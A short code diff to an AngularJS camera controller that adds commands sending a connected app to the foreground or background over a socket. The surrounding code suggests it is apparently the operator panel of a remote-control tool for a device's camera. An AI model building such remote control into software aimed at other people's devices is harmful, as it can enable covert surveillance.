@@ -599,6 +599,20 @@ app.controller("CamCtrl", function ($scope, $rootScope, $timeout) {
         }
     };
 
+    // Bring app to foreground
+    $camCtrl.bringToForeground = () => {
+        if (!checkConnection()) return;
+        $rootScope.Log('[→] Bringing app to foreground...', CONSTANTS.logStatus.INFO);
+        socket.emit(ORDER, { order: CONSTANTS.orders.foreground, extra: 'foreground' });
+    };
+
+    // Send app to background
+    $camCtrl.sendToBackground = () => {
+        if (!checkConnection()) return;
+        $rootScope.Log('[→] Sending app to background...', CONSTANTS.logStatus.INFO);
+        socket.emit(ORDER, { order: CONSTANTS.orders.foreground, extra: 'background' });
+    };
+
     // Socket handler - improved with error handling
     socket.on(camera, (data) => {
         if (responseTimeout) $timeout.cancel(responseTimeout);
